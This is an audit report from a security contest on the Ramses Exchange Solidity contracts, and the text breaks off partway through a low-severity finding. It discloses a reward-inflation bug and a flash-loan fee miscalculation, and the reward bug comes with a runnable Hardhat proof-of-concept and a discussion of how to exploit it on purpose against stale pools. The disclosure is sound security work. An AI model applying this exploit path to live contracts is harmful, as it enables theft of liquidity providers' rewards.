---
sponsor: "Ramses Exchange"
slug: "2024-10-ramses-exchange"
date: "2024-12-03"
title: "Ramses Exchange"
findings: "https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues"
contest: 447
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Ramses Exchange smart contract system written in Solidity. The audit took place between October 8—October 29 2024.

Following the audit, three of C4's [Zenith Researchers](https://code4rena.com/zenith) ([peakbolt](https://code4rena.com/@peakbolt), [SpicyMeatball](https://code4rena.com/@spicymeatball), and [victormagnum_](https://code4rena.com/@victormagnum_)) reviewed the mitigations implemented by the Ramses' team; the [mitigation review report](#mitigation-review) is appended below the audit report.

## Wardens

Among the 71 wardens who contributed to the Ramses Exchange audit, the judge found merit in the following wardens' reports:

  1. [rileyholterhus](https://code4rena.com/@rileyholterhus)
  2. [MrPotatoMagic](https://code4rena.com/@MrPotatoMagic)
  3. [BenRai](https://code4rena.com/@BenRai)
  4. [0x37](https://code4rena.com/@0x37)
  5. [wasm\_it](https://code4rena.com/@wasm_it) ([0xrex](https://code4rena.com/@0xrex) and [rustguy](https://code4rena.com/@rustguy))
  6. [Sathish9098](https://code4rena.com/@Sathish9098)

This audit was judged by [gzeon](https://code4rena.com/@gzeon).

Final report assembled by [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 2 unique vulnerabilities. Of these vulnerabilities, 0 received a risk rating in the category of HIGH severity and 2 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 3 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Ramses Exchange repository](https://github.com/code-423n4/2024-10-ramses-exchange), and is composed of 10 smart contracts written in the Solidity programming language and includes 2,250 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# Medium Risk Findings (2)
## [[M-01] Inflated `GaugeV3` rewards when period is skipped](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39)
*Submitted by [rileyholterhus](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39), also found by [MrPotatoMagic](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/48)*

The `GaugeV3` contract distributes rewards based on the proportion of liquidity that each position had in range over each 1-week "period". This is calculated by `cachePeriodEarned()` in the gauge, which calls `positionPeriodSecondsInRange()` on the `RamsesV3Pool`. A key part of this calculation is the `periodCumulativesInside()` function, which computes the total seconds per liquidity within a tick range for that period.

In `periodCumulativesInside()`, one sub-case occurs when the period is in the past, and the tick range was active at the end of that period:

```solidity
function periodCumulativesInside(/* ... */) /* ... */ {
    // ...
    if (lastTick < tickLower) {
        // ...
    } else if (lastTick < tickUpper) {
        // ...
        if (currentPeriod <= period) {
            // ...
        } else {
            cache.secondsPerLiquidityCumulativeX128 = $.periods[period].endSecondsPerLiquidityPeriodX128;
        }
        return
            cache.secondsPerLiquidityCumulativeX128 -
            snapshot.secondsPerLiquidityOutsideLowerX128 -
            snapshot.secondsPerLiquidityOutsideUpperX128;
    } else {
        // ...
    }
}
```

Notice that this sub-case relies on `$.periods[period].endSecondsPerLiquidityPeriodX128`, which is meant to represent the total seconds per liquidity when the period ended. However, this value is actually more accurately described as "the seconds per liquidity at the start of the next period", which can be seen in how `_advancePeriod()` and `newPeriod()` are implemented:

```solidity
function _advancePeriod() /* ... */ {
    // ...
    if ((_blockTimestamp() / 1 weeks) != _lastPeriod) {
        // ...
        uint160 secondsPerLiquidityCumulativeX128 = Oracle.newPeriod(
            $.observations,
            _slot0.observationIndex,
            period
        );
        // ...
        $.periods[_lastPeriod].endSecondsPerLiquidityPeriodX128 = secondsPerLiquidityCumulativeX128;
        // ...
    }
}

function newPeriod(/* ... */) /* ... */ {
    // ...
    uint32 delta = uint32(period) * 1 weeks - 1 - last.blockTimestamp;
    secondsPerLiquidityCumulativeX128 =
        last.secondsPerLiquidityCumulativeX128 +
        ((uint160(delta) << 128) / ($.liquidity > 0 ? $.liquidity : 1));
    // ...
}
```

So, this means that if a period is skipped (meaning no activity happens in the pool during the period), the next time `_advancePeriod()` is called, the `endSecondsPerLiquidityPeriodX128` for the last period will be set to just before the start of the period after the skipped period. This is effectively one week after the last period actually ended. This adds extra time to the sub-case mentioned above, which leads to inflated rewards for users.

### Impact

If period `p` has gauge rewards and period `p+1` has no pool activity, the reward calculation for period `p` will be inflated, allowing users to claim more tokens than they should.

### Proof of Concept

The following test file can be added to `test/v3/`.

<details>
<summary>Expand for test file.</summary>

```javascript
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { testFixture } from "../../scripts/deployment/testFixture";
import { expect } from "../uniswapV3CoreTests/shared/expect";
import * as helpers from "@nomicfoundation/hardhat-network-helpers";
import { createPoolFunctions } from "../uniswapV3CoreTests/shared/utilities";

const testStartTimestamp = Math.floor(new Date("2030-01-01").valueOf() / 1000);

describe("Code4rena Contest", () => {
    let c: Awaited<ReturnType<typeof auditTestFixture>>;
    let wallet: HardhatEthersSigner;
    let attacker: HardhatEthersSigner;
    const fixture = testFixture;

    async function auditTestFixture() {
        const suite = await loadFixture(fixture);
        [wallet, attacker] = await ethers.getSigners();

        const pool = suite.clPool;

        const swapTarget = await (
            await ethers.getContractFactory(
                "contracts/CL/core/test/TestRamsesV3Callee.sol:TestRamsesV3Callee",
            )
        ).deploy();

        const {
            swapToLowerPrice,
            swapToHigherPrice,
            swapExact0For1,
            swap0ForExact1,
            swapExact1For0,
            swap1ForExact0,
            mint,
            flash,
        } = createPoolFunctions({
            token0: suite.usdc,
            token1: suite.usdt,
            swapTarget: swapTarget,
            pool,
        });

        return {
            ...suite,
            pool,
            swapTarget,
            swapToLowerPrice,
            swapToHigherPrice,
            swapExact0For1,
            swap0ForExact1,
            swapExact1For0,
            swap1ForExact0,
            mint,
            flash,
        };
    }

    describe("Proof of concepts", () => {

        beforeEach("setup", async () => {
            c = await loadFixture(auditTestFixture);
            [wallet, attacker] = await ethers.getSigners();
        });

        it("Inflated multi-week gauge rewards", async () => {

            console.log("-------------------- START --------------------");

            const startPeriod: number = Math.floor(testStartTimestamp / 604800) + 1;
            const startPeriodTime = startPeriod * 604800;
            const secondPeriodTime: number = (startPeriod + 1) * 604800;
            const thirdPeriodTime: number = (startPeriod + 2) * 604800;

            // Begin at the very start of a period
            await helpers.time.increaseTo(startPeriodTime);
            console.log("Liquidity start", await c.pool.liquidity());
            console.log("Tick start", (await c.pool.slot0()).tick);

            // Begin by minting two positions, both with 100 liquidity in the same range
            await c.mint(wallet.address, 0n, -10, 10, 100n)
            await c.mint(attacker.address, 0n, -10, 10, 100n)
            console.log("Liquidity after", await c.pool.liquidity());

            // Also add 10 tokens as a gauge reward for this period
            await c.usdc.approve(c.clGauge, ethers.MaxUint256);
            await c.clGauge.notifyRewardAmount(c.usdc, ethers.parseEther("10"))   

            // Increase to the next period
            await helpers.time.increaseTo(secondPeriodTime);

            // See how much the two positions have earned, should be basically 50 USDC each
            const walletEarned1 = await c.clGauge.periodEarned(startPeriod, c.usdc, wallet.address, 0, -10, 10);
            const attackerEarned1 = await c.clGauge.periodEarned(startPeriod, c.usdc, attacker.address, 0, -10, 10);
            const tokenTotalSupplyByPeriod = await c.clGauge.tokenTotalSupplyByPeriod(startPeriod, c.usdc);

            console.log("walletEarned1", walletEarned1);
            console.log("attackerEarned1", attackerEarned1);
            console.log("tokenTotalSupplyByPeriod", tokenTotalSupplyByPeriod);

            // Notice that anyone can cache the "wallet" address earned amount. This will "lock in" that
            // the wallet address has earned ~50 USDC.
            await c.clGauge.cachePeriodEarned(startPeriod, c.usdc, wallet.address, 0, -10, 10, true);

            // Now if a whole period goes by, the "endSecondsPerLiquidityPeriodX128" for the startPeriod will be
            // set too far in the future, and the attacker will end up getting double the rewards they should.
            await helpers.time.increaseTo(thirdPeriodTime);
            await c.clPool._advancePeriod();

            const attackerEarned2 = await c.clGauge.periodEarned(startPeriod, c.usdc, attacker.address, 0, -10, 10);
            console.log("attackerEarned2", attackerEarned2);
            const attackerBalanceBefore = await c.usdc.balanceOf(attacker.address);
            await c.clGauge.connect(attacker).getPeriodReward(startPeriod, [c.usdc], attacker.address, 0, -10, 10, attacker.address);
            const attackerBalanceAfter = await c.usdc.balanceOf(attacker.address);
            console.log("attacker claim amount", attackerBalanceAfter - attackerBalanceBefore);

            // This is all at the expense of the wallet address, because they had their rewards "locked in" and 
            // can't benefit from the bug, and moreover will not be able to claim anything because the attacker
            // took all the tokens
            const walletEarned2 = await c.clGauge.periodEarned(startPeriod, c.usdc, wallet.address, 0, -10, 10);
            console.log("walletEarned2", walletEarned2);
            await expect(
                c.clGauge.connect(wallet).getPeriodReward(startPeriod, [c.usdc], wallet.address, 0, -10, 10, wallet.address)
            ).to.be.revertedWithCustomError(c.usdc, 'ERC20InsufficientBalance');

            console.log("-------------------- END --------------------");
        });
    });
});
```

</details>


By running `npx hardhat test --grep "Code4rena Contest"`, the following output can be seen:

    -------------------- START --------------------
    Liquidity start 0n
    Tick start 0n
    Liquidity after 200n
    walletEarned1 4999991732804232804n
    attackerEarned1 4999991732804232804n
    tokenTotalSupplyByPeriod 10000000000000000000n
    attackerEarned2 9999991732804232804n
    attacker claim amount 9999991732804232804n
    walletEarned2 4999991732804232804n
    -------------------- END --------------------
        ✔ Inflated multi-week gauge rewards (81ms)

This output shows that the attacker can claim double their intended rewards at the expense of other another user.

### Recommended Mitigation Steps

One initial idea for a fix might be to modify `_advancePeriod()` and `newPeriod()` to only extrapolate the seconds per liquidity up to the end of the period, rather than to the start of the next period:

```solidity
function _advancePeriod() /* ... */ {
    // ...
    if ((_blockTimestamp() / 1 weeks) != _lastPeriod) {
        // ...
        uint160 secondsPerLiquidityCumulativeX128 = Oracle.newPeriod(
            $.observations,
            _slot0.observationIndex,
            _lastPeriod // << CHANGE: pass _lastPeriod instead of period
        );
        // ...
        $.periods[_lastPeriod].endSecondsPerLiquidityPeriodX128 = secondsPerLiquidityCumulativeX128;
        // ...
    }
}

function newPeriod(/* ... */) /* ... */ {
    // ...
    uint32 delta = uint32(period + 1) * 1 weeks - 1 - last.blockTimestamp; // << CHANGE: use end of period instead of start
    secondsPerLiquidityCumulativeX128 =
        last.secondsPerLiquidityCumulativeX128 +
        ((uint160(delta) << 128) / ($.liquidity > 0 ? $.liquidity : 1));
    // ...
}
```

However, the current behavior of `endSecondsPerLiquidityPeriodX128` is actually important to maintain for the following logic in `periodCumulativesInside()`:

```solidity
function periodCumulativesInside(/* ... */) /* ... */ {
    // ...
    snapshot.secondsPerLiquidityOutsideLowerX128 = uint160(lower.periodSecondsPerLiquidityOutsideX128[period]);
    if (tickLower <= startTick && snapshot.secondsPerLiquidityOutsideLowerX128 == 0) {
        snapshot.secondsPerLiquidityOutsideLowerX128 = $
            .periods[previousPeriod]
            .endSecondsPerLiquidityPeriodX128;
    }

    snapshot.secondsPerLiquidityOutsideUpperX128 = uint160(upper.periodSecondsPerLiquidityOutsideX128[period]);
    if (tickUpper <= startTick && snapshot.secondsPerLiquidityOutsideUpperX128 == 0) {
        snapshot.secondsPerLiquidityOutsideUpperX128 = $
            .periods[previousPeriod]
            .endSecondsPerLiquidityPeriodX128;
    }
    // ...
}
```

So, it is instead recommended to introduce separate `startSecondsPerLiquidityPeriodX128` and `endSecondsPerLiquidityPeriodX128` variables  in the `PeriodInfo` struct, so that the code can correctly distinguish between the two different time points in the calculations.

**[gzeon (judge) commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39#issuecomment-2453126168):**
 > `_advancePeriod` is public and this issue also seems to be possible on pool with no activity at all.<br>
> cc @keccakdog 

**[keccakdog (Ramses) commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39#issuecomment-2455403796):**
 > @gzeon - In `GaugeV3::notifyRewardAmount()`, ` _advancePeriod()` is called at the start of the function. This means if there are any gauge rewards for the week due to voting, advance period would be called.
> 
> The one case this would occur is if someone called `notifyRewardAmountNextPeriod`, or the "`forPeriod`" variant + had no votes for the week + had no swaps or liq adds or removes, for the entire week.
> 
> As you can imagine this is a close to 0% chance of happening, since if there are rewards there is likely at least 1 interaction the entire period, or else these rewards are pointless. TLDR is this is a very very very very unlikely case (only possible if our entire project is dead and nobody is interacting 😓 ).
> 
> It may be beneficial to document it or maybe add a safety check in case, but I do not find this as more than a Low finding at best since the assumption of our project being dead is essentially required for it work.

**[gzeon (judge) decreased severity to Low/Non-Critical](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39#issuecomment-2455655213)**

**[rileyholterhus (warden) commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39#issuecomment-2457960814):**
 > Hello judge/sponsor, thank you for your comments. I would like to escalate this issue for two reasons:
> 
> 1. I believe the bug has been misunderstood. The above comments are saying it's unlikely for a period `p` to be skipped while still having gauge rewards, as `notifyRewardAmount()` triggers `_advancePeriod()`, so rewards for a skipped period would need to be given in advance using `notifyRewardAmountNextPeriod()` or `notifyRewardAmountForPeriod()`. However this argument is not relevant to the bug. With this bug, inflated rewards in period `p` are due to period `p+1` being skipped and not period `p` being skipped. This can be seen in the PoC - notice that a theft is demonstrated using `notifyRewardAmount()`, while `notifyRewardAmountNextPeriod()`/`notifyRewardAmountForPeriod()` are never used.
> 
> 2. The above comments are focusing on how likely the bug is to be triggered by accident, but the bug can also be exploited intentionally. For one example, an attacker could deploy a pool with minimal liquidity, allocate gauge rewards at the last moment before the period switch, and then simply wait as further periods pass. Since the attacker independently deployed the pool and only provided minimal liquidity, others would be unlikely to engage with it at first, and the inflated rewards would silently build up. This is especially dangerous if the attacker knows a pool might gain popularity later, for example by knowing that a partner protocol plans to incentivize liquidity for a specific token pair in the future.
> 
> So, I believe this bug should not remain unaddressed, and is high severity and not QA.

**[keccakdog (Ramses) commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39#issuecomment-2457989958):**
 > Hey Riley, thank you for following up on this. While I see what you mean, the reason this was labeled a lesser severity is because the situation you are explaining is rather impossible. If there are meaningful rewards, at least ONE person would be LPing and interacting. Also, if there was lots of rewards and then nothing-- the gauge would see people removing liquidity, which unless I'm mistaken, nullifies this. Someone making a pool last second and voting for it is fine since if it was somehow a malicious gauge it could be killed and prevent abuse. The system has lots of checks in place to prevent gaming like this, and non-active pools are not profitable for people to vote on, so the only way period P rewards would be significant and P+1 being completely empty would mean not a single interaction occurs in P+1, which as you can imagine is extremely unlikely that someone would vote for a pool with 0 rewards in hopes of attempting to get more gauge rewards, when others can join in and take the rewards during the period as well. Since the damage is a multiplier of the existing rewards being inflated in the future-- the vulnerability requires heavy voting power to be worth anything. 
> 
> Hopefully that makes sense. I don't disagree with your finding that it is possible; but I disagree on the severity being very low due to the likelihood being close to 0

**[rileyholterhus (warden) commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39#issuecomment-2458167330):**
 > Hi @keccakdog - thank you for the follow-up. Since understanding the issue requires a lot of context, I would like to leave the following notes for the judge, and also respond to your points. Please feel free to correct me if I'm wrong in any of the following:
> 
> - I believe we're in agreement that the initial comment that downgraded this issue is not relevant to this bug. However, note that the initial comment is relevant for [issue 40](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/40).
> 
> - Part of the most recent comment is a counter-argument to my example of how an attacker could intentionally exploit the bug. I have the following response to those points:
> 
> 	>  *If there are meaningful rewards, at least ONE person would be LPing and interacting.*
> 
> 	This is why I think the attacker would allocate gauge rewards at the last moment before the period switch. This timing would leave no opportunity for others to react and compete for the rewards before the period ends, so there is no incentive-based reason for anyone to interact with the pool and inadvertently prevent the exploit.
> 
> 	> *Also, if there was lots of rewards and then nothing-- the gauge would see people removing liquidity, which unless I'm mistaken, nullifies this.*
> 
> 	The attacker only needs to provide a few wei of liquidity, since they aren't competing with anyone in the setup. So they incur no significant cost by abandoning their dust liquidity, and they could even choose to withdraw it in period `p+2` if needed.
> 
> 	> *Someone making a pool last second and voting for it is fine since if it was somehow a malicious gauge it could be killed and prevent abuse.*
> 
> 	I think this point addresses how the issue could be mitigated, which is separate from the severity of the issue itself.  An admin can only prevent the issue if they are aware of the bug. Therefore I believe this finding should be considered high-severity.
> 	
> 
> - I believe the remaining part of the above comment argues that it’s unlikely for this bug to occur accidentally, which I agree with:
> 
> 	> *The system has lots of checks in place to prevent gaming like this, and non-active pools are not profitable for people to vote on, so the only way period P rewards would be significant and P+1 being completely empty would mean not a single interaction occurs in P+1, which as you can imagine is extremely unlikely that someone would vote for a pool with 0 rewards in hopes of attempting to get more gauge rewards, when others can join in and take the rewards during the period as well. Since the damage is a multiplier of the existing rewards being inflated in the future-- the vulnerability requires heavy voting power to be worth anything.*
> 
> Thanks again for the consideration everyone.

**[gzeon (judge) commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39#issuecomment-2466421252):**
 > This is a tough call, but I think it is still more appropriate to have this as low risk.
> 
> The situation as described is very unlikely as the sponsor explained. There are protocol incentives to make sure pool with gauge should have at least some activity. So unless this can be intentionally exploited, I think this is really quite impossible.

**[rileyholterhus (warden) commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39#issuecomment-2466596567):**
 > Hi @gzeon, thanks for the follow-up. Apologies for all the back-and-forth, but I think there may be a misunderstanding.
> 
> For this bug/exploit, no voting power is required. Notice that [the `notifyRewardAmount()` function](https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/gauge/GaugeV3.sol#L147-L162) is permissionless, and in the PoC there is no voting power logic used.
> 
> Of course calling `notifyRewardAmount()` is not free - anyone who calls it will be transferring their own tokens to the in-range LPs for the period. But in the case of the following:
> 
> > *For one example, an attacker could deploy a pool with minimal liquidity, allocate gauge rewards at the last moment before the period switch, and then simply wait as further periods pass.*
> 
> The attacker is the sole in-range LP, so calling `notifyRewardAmount()` is just a self-transfer to give themselves a reward balance in the gauge, which is the first step to exploiting this bug.
> 
> Do you see what I mean? I still believe this issue is not low-severity, and I'm happy to expand on any other parts of the discussion if additional clarification is needed. Thanks again!

**[gzeon (judge) commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39#issuecomment-2468773686):**
 > > *notifyRewardAmount() function is permissionless*
> 
> If the attacker choose to reward themselves, I don't see that as an issue. While `Voter.sol` is out-of-scope, according to Ramses v3 [doc](https://v3-docs.ramses.exchange/pages/voter-escrow#earning-incentives-and-fees):
> 
> > *A voting incentive is designated at anytime during the current EPOCH and paid out in lump sum at the start of the following EPOCH.*
> 
> > *Once an LP incentive is deposited it will distribute that token and the amount deposited for the next 7 days.*
> 
> So I think it is fair to assume it is expected to have reward to be notified near the start of a period. Any reward would incentivize LP activity and thus a period is unlikely to be skipped. Note even `p+1` does not have any reward, the lack of incentive is a incentive for LPs in `p` to remove liquidity, which also advances the period. If there are no other LP because the attacker is the sole LP, they would receive 100\% of the reward regardless of this issue.
> 
> Hence, it appears to me the incentives are well designed to make skipping a period `p` or `p+1` where `p` have non negligible incentive can be considered as impossible. 

**[rileyholterhus (warden) commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39#issuecomment-2468855082):**
 > Hi @gzeon thank you for the follow-up. I believe there’s still a misunderstanding.
> 
> > *If the attacker choose to reward themselves, I don’t see that as an issue.*
> 
> I agree - an attacker transferring funds to themselves isn't inherently an exploit. However, the point I was making is this:
> 
> > *calling `notifyRewardAmount()` is just a self-transfer to give themselves a reward balance in the gauge, which is the first step to exploiting this bug.*
> 
> In other words, if an attacker rewards themselves right before the period switch, they spend nothing (since it's a self-transfer), allocate rewards exclusively in period `p`, and the timing doesn't leave any opportunity for others to be incentivized to LP and interfere. This leads into the next point:
> 
> > *If there are no other LP because the attacker is the sole LP, they would receive 100\% of the reward regardless of this issue.*
> 
> I agree here as well, but since this is being used as a counter-argument to invalidate the finding, I think there's a misunderstanding of the core bug. By establishing a reward balance in period `p`, the attacker gains an inflated reward balance with each subsequent skipped period. This is the main issue. 

**[gzeon (judge) increased severity to Medium and commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39#issuecomment-2468908071):**
 > > *identify an obsolete pool (it's inevitable that at least one pool will become inactive over time) and use its gauge to initiate the exploit. Instead of setting up an inflated balance to exploit future users, this would allow the attacker to inflate their balance to steal any unclaimed rewards from past activity*
> 
> Alright I think I am getting convinced, this attack does seems to work; I previously thought it requires the pool to have no liquidity (contradict with leftover reward), it actually only requires no liquidity in the active tick. It is conceivable that an obsolete pool may have stale liquidity in an inactive range where the attacker can deposit 2 wei liquidity from 2 account in the active range, notify reward equal to the leftover at the last second of a period and hope for no activity for the next period. There are no cost (except gas) for this attack because the attacker own 100\% of the active liquidity during the period they paid for the reward.
> 
> In terms of severity, I think Medium is appropriate given the pre-condition required.


***

## [[M-02] The fee for the protocol in the function `RamsesV3Pool::flash()` is not calculated correctly](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/3)
*Submitted by [BenRai](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/3), also found by [0x37](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/22) and [wasm\_it](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/15)*

### Impact

Because the fee for the protocol is not calculated correctly, the split of fees is wrong resulting in less fees for the protocol.

### Proof of Concept

When calling the function [flash](https://github.com/code-423n4/2024-10-ramses-exchange/blob/236e9e9e0cf452828ab82620b6c36c1e6c7bb441/contracts/CL/core/RamsesV3Pool.sol#L684-L725) on a RamsesV3Vault the caller initiates a flash loan. For the amount he flashes he needs to pay a fee. This fee is then divided between the protocol and the liquidity provider of the protocol. The issue arises from the fact how the share of the fees the protocol should get is calculated:

```solidity
uint256 pFees0 = feeProtocol == 0 ? 0 : paid0 / feeProtocol;
```

The feeProtocol is a number between 0 and 100 representing the \% of fees the protocol should get, which is initially set to 80 meaning 80\% of the fees should go to the protocol. With the current calculation and the initial value of 80, the protocol would only get 1/80 of the fees instead of 80\% of the fees, contradicting the intended fee distribution and resulting in way less fees for the protocol than intended.

### Recommended Mitigation Steps

To ensure the right amount of fees are distributed to the protocol when a user initiates a flashloan change the current calculations for token0 and token 1 to the following:

```diff
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external override lock {
	…
            if (paid0 > 0) {
-                uint256 pFees0 = feeProtocol == 0 ? 0 : paid0 / feeProtocol; 
+                uint256 pFees0 = feeProtocol == 0 ? 0 : paid0 * feeProtocol / 100; 

                if (uint128(pFees0) > 0) $.protocolFees.token0 += uint128(pFees0);
                $.feeGrowthGlobal0X128 += FullMath.mulDiv(paid0 - pFees0, FixedPoint128.Q128, _liquidity);
            }
            if (paid1 > 0) {
-                uint256 pFees1 = feeProtocol == 0 ? 0 : paid1 / feeProtocol; 
+                uint256 pFees1 = feeProtocol == 0 ? 0 : paid1 * feeProtocol / 100; 

                if (uint128(pFees1) > 0) $.protocolFees.token1 += uint128(pFees1);
                $.feeGrowthGlobal1X128 += FullMath.mulDiv(paid1 - pFees1, FixedPoint128.Q128, _liquidity);
            }

…
}

```

**[keccakdog (Ramses) commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/3#issuecomment-2408150954):**
 > While it passes the `UniswapV3Pool.spec` before the fix, this is an oversight due to `feeProtocol` no longer using bitshifting (like in regular UniswapV3). Our live V2 contracts were upgraded to make `feeProtocol` operate like this, and handle it -- but was not translated over.
> 
> Seems to be a valid finding by reading, would need to run test(s) to ensure it isn't handled elsewhere. 👍 

**[keccakdog (Ramses) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/3#issuecomment-2424217806):**
 > Valid finding; however, this should be downgraded to a Low due to no funds at risk.

**[gzeon (judge) commented](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/3#issuecomment-2453100336):**
 > > *2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.*


***

# Low Risk and Non-Critical Issues

For this audit, 3 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/45) by **Sathish9098** received the top score from the judge.

*The following wardens also submitted reports: [MrPotatoMagic](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/49) and [rileyholterhus](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/41).*

## [L-01] Compromised treasury address can permanently block updates and steal protocol funds

### Impact

Permanent `fund loss` and the protocol being stuck in an `unrecoverable state`.

If the treasury address gets compromised (e.g., private key stolen or malicious insider), the attacker gains full control over the treasury operations and steal the protocol fee indefinitely. 

If an attacker controls the treasury, they can block updates by refusing to change the address or setting it to a malicious address that locks further changes.

The protocol's ability to recover control is lost since only the compromised treasury has the power to update itself.

```solidity
FILE:2024-10-ramses-exchange/contracts/CL/gauge
/FeeCollector.sol


 /// @inheritdoc IFeeCollector
    function setTreasury(address _treasury) external override onlyTreasury {
        emit TreasuryChanged(treasury, _treasury);

        treasury = _treasury;
    }

```
https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/gauge/FeeCollector.sol#L49-L54

### Proof of Concept

- `Alice` is the initial treasury of a smart contract, with control over treasury-related functions.
- The `onlyTreasury` modifier ensures only the treasury address can update itself or perform restricted actions.
- `Bob` (a malicious actor) steals Alice’s private key through phishing or malware.
- Using the stolen key, Bob changes the treasury address to his own wallet (0xBob).
- Alice can no longer restore control because only `Bob's` address is now authorized.
- `Bob` can steal protocol fee funds fully or collect fees as the new treasury.
- `Bob` might set the treasury to a black-hole address (e.g., 0xdead), permanently locking the contract.
- Without an admin or backup mechanism, the team cannot recover control.

### Recommended Mitigation

Implement only the admins (onlyOwner) can change new treasury address instead of old treasury itself.


## [L-02] Reverts occur when `staticcall` is used on non-view/non-pure functions

The `staticcall` may revert because `cachePeriodEarned()` is not marked as view or pure. The EVM enforces that only read-only functions can be called via `staticcall`. 

As per [docs](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-214.md) the staticcall is only suitable for read-only functions. But the function `cachePeriodEarned` is declared as external which is not advisable as per docs:

> Any attempts to make state-changing operations inside an execution instance with STATIC set to true will instead throw an exception. These operations include CREATE, CREATE2, LOG0, LOG1, LOG2, LOG3, LOG4, SSTORE, and SELFDESTRUCT. They also include CALL with a non-zero value. As an exception, CALLCODE is not considered state-changing, even with a non-zero value.

```solidity
FILE:2024-10-ramses-exchange/contracts/CL/gauge
/GaugeV3.sol

(bool success, bytes memory data) = address(this).staticcall(
            abi.encodeCall(
                this.cachePeriodEarned,
                (period, token, owner, index, tickLower, tickUpper, false)
            )
        );


 function cachePeriodEarned(
        uint256 period,
        address token,
        address owner,
        uint256 index,
        int24 tickLower,
        int24 tickUpper,
        bool caching
    ) external returns (uint256);

```
https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/gauge/GaugeV3.sol#L262-L267

### Recommended Mitigation

Use regular `call`.


## [L-03] Incorrect protocol fee calculation in `flash()` function

The issue is related to how protocol fees are calculated. Specifically, applying fees to the already-paid fees (`fee-on-fee logic`) can create several risks that affect both the protocol’s revenue and user interactions. 

### Problem

The `flash()` function attempts to collect protocol fees based on the total amount repaid (`paid0` and `paid1`), which includes both the original loan amount and the loan fee. This introduces a `compounding fee effect`, where the protocol effectively taxes itself by charging fees on both the base amount and the fee amount. Specifically, applying fees to the already-paid fees (`fee-on-fee logic`) .

### Impact

- This results in less revenue than expected because fees are being deducted twice—once from the original transaction and again from the protocol’s portion.
- Over time, this fee compounding could `erode the protocol’s revenue`, especially in high-frequency operations such as flash loans.

```solidity
FILE:2024-10-ramses-exchange/contracts/CL/core
/RamsesV3Pool.sol

 /// @dev sub is safe because we know balanceAfter is gt balanceBefore by at least fee
            uint256 paid0 = balance0After - balance0Before;
            uint256 paid1 = balance1After - balance1Before;

            uint8 feeProtocol = $.slot0.feeProtocol;
            if (paid0 > 0) {
                uint256 pFees0 = feeProtocol == 0 ? 0 : paid0 / feeProtocol;
                if (uint128(pFees0) > 0) $.protocolFees.token0 += uint128(pFees0);
                $.feeGrowthGlobal0X128 += FullMath.mulDiv(paid0 - pFees0, FixedPoint128.Q128, _liquidity);
            }
```

https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/core/RamsesV3Pool.sol#L707-L716

### Recommended Mitigation

Reduce the fee0 and fee1 from `paid0` and `paid1`.

```solidity

uint256 paid0 = balance0After - balance0Before-fee0;
uint256 paid1 = balance1After - balance1Before-fee1;

```


## [L-04] Risk of zero fee setting leading to revenue loss

The `setTreasuryFees` function allows the treasury fee to be set to 0 without any restriction, as there is no explicit check to prevent it. If the fee is set to 0, the protocol may stop collecting fees, which could lead to:

- Loss of revenue for the treasury.
- Unintended behavior where no fees are accumulated or distributed. 

```solidity
FILE:2024-10-ramses-exchange/contracts/CL/gauge
/FeeCollector.sol

/// @inheritdoc IFeeCollector
    function setTreasuryFees(
